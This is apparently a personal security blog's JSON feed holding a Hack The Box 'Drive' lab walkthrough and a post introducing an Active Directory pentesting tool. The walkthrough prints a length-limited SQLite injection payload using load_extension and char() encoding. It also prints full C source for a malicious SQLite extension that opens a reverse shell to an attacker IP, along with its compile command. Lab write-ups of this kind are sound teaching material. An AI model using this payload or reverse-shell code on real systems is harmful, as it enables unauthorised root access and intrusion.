{
    "version": "https://jsonfeed.org/version/1",
    "title": "personal blog",
    "subtitle": "",
    "icon": "https://phrism.info/images/favicon.ico",
    "description": "hacking and researching",
    "home_page_url": "https://phrism.info",
    "items": [
        {
            "id": "https://phrism.info/HTB-Drive-Walkthrough/",
            "url": "https://phrism.info/HTB-Drive-Walkthrough/",
            "title": "HTB Drive Walkthrough",
            "date_published": "2023-10-16T02:08:16.000Z",
            "content_html": "<h1 id=\"htb-drive-walkthrough\"><a class=\"anchor\" href=\"#htb-drive-walkthrough\">#</a> HTB Drive Walkthrough</h1>\n<p>2023-10-16</p>\n<h2 id=\"basic-information\"><a class=\"anchor\" href=\"#basic-information\">#</a> Basic Information</h2>\n<p><img data-src=\"/htb/Drive/0.png\" alt=\"\" /></p>\n<ul>\n<li>difficulty: hard</li>\n<li>ip: 10.10.11.235</li>\n</ul>\n<h2 id=\"port-scan\"><a class=\"anchor\" href=\"#port-scan\">#</a> Port Scan</h2>\n<p><img data-src=\"/htb/Drive/1.png\" alt=\"\" /><br />\nFrom the result of nmap, we can find that the machine open 80 port for http, and open 3000 port but it connot be visited, this 3000 port service most likely it is a web service accessed from the intranet, then we add drive.htb to our /etc/hosts</p>\n<p>/etc/hosts:</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>10.10.11.235    drive.htb</pre></td></tr></table></figure><h2 id=\"user-access\"><a class=\"anchor\" href=\"#user-access\">#</a> User Access</h2>\n<p>Visit the website on 10.10.11.235:80, which is a google drive website and is used to share your files on this website<br />\n<img data-src=\"/htb/Drive/2.png\" alt=\"image\" /><br />\nWe can register a user and upload a file to the server, then we can view or edit our file online and set 'reverse files' perporty to our file<br />\n<img data-src=\"/htb/Drive/3.png\" alt=\"image\" /><br />\nWhen I view my reverse file I uploaded, I found that I can access the block file via id, for example, my file id is 125, so I ran bursuite intrutor to bruteforce the file id that can be accessed, I got information with id 79 and 101:<br />\n<img data-src=\"/htb/Drive/6.png\" alt=\"image\" /><br />\n<img data-src=\"/htb/Drive/7.png\" alt=\"image\" /><br />\nI got the user martin's password and know that there's backup files in the /var/www/backups on the server<br />\nThen I can use ssh to login to machine with user martin and see the backup files:<br />\n<img data-src=\"/htb/Drive/8.png\" alt=\"image\" /><br />\nTo unzip the 7z file, we need a password, so we now have to find the password; Notice that the nmap result shows that the machine runs some service on port 3000, I use chisel to forward port 3000 on the server to the local kali:</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>chisel server --port 12345 --reverse // on kali</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>chisel client [kali_ip]:12345 R:3000:localhost:3000 // on machine</pre></td></tr></table></figure><p>Then I can access machine's port 3000 by visiting localhost:3000:<br />\n<img data-src=\"/htb/Drive/9.png\" alt=\"image\" /><br />\nI login to gitea using the martin's mail and password, I find the achieve password in the repository<br />\n<img data-src=\"/htb/Drive/10.png\" alt=\"image\" /><br />\nwith unzipping the 7z files we get before with the password we get, there's use hashes stored in the db.sqlite3 file. With the help of hashcat, I got the password of tom:<br />\n<img data-src=\"/htb/Drive/11.png\" alt=\"\" /><br />\n<img data-src=\"/htb/Drive/12.png\" alt=\"\" /></p>\n<h2 id=\"root-access\"><a class=\"anchor\" href=\"#root-access\">#</a> Root Access</h2>\n<p>The permissions of file /home/tom/doodleGrive-cli is wired, it seems that I can get root access if I can inject some script into the file and un the file as root.<br />\n<img data-src=\"/htb/Drive/13.png\" alt=\"\" /><br />\ndownload to doodleGrive-cli to my machine an<br />\nd use ida to reverse, I got the username and password to run this file and the basic function of the file, option 5 has the vulnerbility of sql injecting:<br />\n<img data-src=\"/htb/Drive/14.png\" alt=\"\" /><br />\n<img data-src=\"/htb/Drive/15.png\" alt=\"\" /><br />\nThere's some restrictions when doing sql injection, for example the sanitize_string function will limit your input with 39 character, and the spectial character like &quot;;&quot;,&quot;/&quot;,&quot;|&quot; will be replaced with &quot;&quot;. However, I can still bypass these restrictions and get rce with load_extension and evil-so file.<br />\nWith the sqlite injection, we can input</p>\n<pre><code>&quot;+load_extension(&quot;./e&quot;)--\n</code></pre>\n<p>into the username and load an .so file, to bypass &quot;/&quot;, we use char() to encode our exploit:</p>\n<pre><code>&quot;+load_extension(char(46,47,101))--\n</code></pre>\n<p>which is 35 characters.<br />\nThen I find a evil.c on the internet and compile it into <span class=\"exturl\" data-url=\"aHR0cDovL2Uuc28=\">e.so</span>:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Add your header comment here */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sqlite3ext.h></span> <span class=\"token comment\">/* Do not use &lt;sqlite3.h>! */</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/socket.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;arpa/inet.h></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dirent.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>SQLITE_EXTENSION_INIT1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">/* Insert your extension code here */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">int</span> tcp_port <span class=\"token operator\">=</span> <span class=\"token number\">7777</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>ip <span class=\"token operator\">=</span> <span class=\"token string\">\"10.10.1.1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_WIN32</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>dllexport<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">sqlite3_extension_init</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  sqlite3 <span class=\"token operator\">*</span>db<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>pzErrMsg<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">const</span> sqlite3_api_routines <span class=\"token operator\">*</span>pApi</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">int</span> rc <span class=\"token operator\">=</span> SQLITE_OK<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">SQLITE_EXTENSION_INIT2</span><span class=\"token punctuation\">(</span>pApi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    addr<span class=\"token punctuation\">.</span>sin_family <span class=\"token operator\">=</span> AF_INET<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    addr<span class=\"token punctuation\">.</span>sin_port <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span>tcp_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    addr<span class=\"token punctuation\">.</span>sin_addr<span class=\"token punctuation\">.</span>s_addr <span class=\"token operator\">=</span> <span class=\"token function\">inet_addr</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    fd <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token function\">dup2</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token function\">dup2</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">dup2</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token keyword\">return</span> rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>compile it with gcc:</p>\n<pre><code class=\"language-cmd\">gcc -g -fPIC -shared evil.c -o e.so\n</code></pre>\n<p>upload the <span class=\"exturl\" data-url=\"aHR0cDovL2Uuc28=\">e.so</span> to /home/tom in the target machine, and input my payload after running doodlGrive-cli, I get root shell reverse to my kali.</p>\n<h2 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h2>\n<ul>\n<li>DAS 关于一道 Sqlite 注入 RCE 的题目<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMjg4MDY1\"> https://cloud.tencent.com/developer/article/2288065</span></li>\n</ul>\n",
            "tags": [
                "HTB"
            ]
        },
        {
            "id": "https://phrism.info/winAD-APT/",
            "url": "https://phrism.info/winAD-APT/",
            "title": "winAD-APT",
            "date_published": "2023-10-14T04:33:47.000Z",
            "content_html": "<h1 id=\"windows-ad-auto-pentest-tool\"><a class=\"anchor\" href=\"#windows-ad-auto-pentest-tool\">#</a> Windows AD Auto Pentest Tool</h1>\n<h2 id=\"introduce\"><a class=\"anchor\" href=\"#introduce\">#</a> Introduce</h2>\n<p><img data-src=\"/self_develop/winAD-APT/0.png\" alt=\"\" /><br />\nWinAD-APT, is the windwos active directory auto pentesting tool's abbreviation. When I do some windows activate pentesing research, I found that the tools for windows active directory pentesting is complex, so I write this tool to integrated the tools which is useful for all the usual payload and exploit, and provide a ui website so make ADpentesting more easily.</p>\n<p>This tool is made of python streamlit, and mainly use linux command to do the pentesting, all the things we need to do is to full in the blanks like username and password, and click the button to exploit.</p>\n<p>This tool is still being developed, it is recommand to add your command into this tool and customize your own tool</p>\n<p>The tool is uploaded to github: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BocmlzbS9XaW5BRC1BUFQ=\">winAD-APT</span> , it is welcome to download and test it,  if you think the project is useful, a star is appreciated.</p>\n<h2 id=\"usage\"><a class=\"anchor\" href=\"#usage\">#</a> Usage</h2>\n<p>When you run the <span class=\"exturl\" data-url=\"aHR0cDovL1N0YXJ0LnB5\">Start.py</span> file in the winAD-APT, your brower will automatically stared and lead you to the start page, you can set your target ip here<br />\n<img data-src=\"/self_develop/winAD-APT/1.png\" alt=\"\" /></p>\n<p>The winAD-APT is made of 7 sub-parts:</p>\n<ul>\n<li>Nmap</li>\n<li>InfoGather</li>\n<li>Lateralpenetration</li>\n<li>PermissionSploit</li>\n<li>CrackHash</li>\n<li>History</li>\n<li>ViewFile</li>\n</ul>\n<p>In Nmap,  you can start your nmap scan and custom the parameters in nmap, default is &quot;-sV -sC -A -Pn -T4&quot;, you can set your target domain here, and the open port information is essential for the lateral information gather.<br />\n<img data-src=\"/self_develop/winAD-APT/7.png\" alt=\"\" /></p>\n<p>In InfoGather, you can use different tools like rpcclient, smbclient etc. to gather information according to the open port the nmap showed, you need to set your target ip and target domian before use this part of tools<br />\n<img data-src=\"/self_develop/winAD-APT/2.png\" alt=\"\" /></p>\n<p>In Lateralpenetration, you can use common lateral pentetrstion tools like bloodhound, powerview or ldapmonitor, you can set the username and credentials you get in InforGather part, and all the credentails are stored by fault.<br />\n<img data-src=\"/self_develop/winAD-APT/3.png\" alt=\"\" /></p>\n<p>In PermissionSploit, this part is mainly accomplished by winrm, and use windows commad instead of linux command, so there's not much auto pentesting tool here, there's some tips and command listed here for usage<br />\n<img data-src=\"/self_develop/winAD-APT/6.png\" alt=\"\" /></p>\n<p>In CrackHash, you can paste your password hash here and use either hashcat ot john to crack the hash.<br />\n<img data-src=\"/self_develop/winAD-APT/4.png\" alt=\"\" /></p>\n<p>In History, you can see all the history input and output here, so there's no need to clear your command line and lose some important information<br />\n<img data-src=\"/self_develop/winAD-APT/8.png\" alt=\"\" /></p>\n<p>In ViewFile, you can view and edit the user and password file stored on your system, and save them from the ui, you can also use notes to take notes whenever you like, please do not forget to pres the save button!<br />\n<img data-src=\"/self_develop/winAD-APT/5.png\" alt=\"\" /></p>\n",
            "tags": [
                "self_develop"
            ]
        }
    ]
}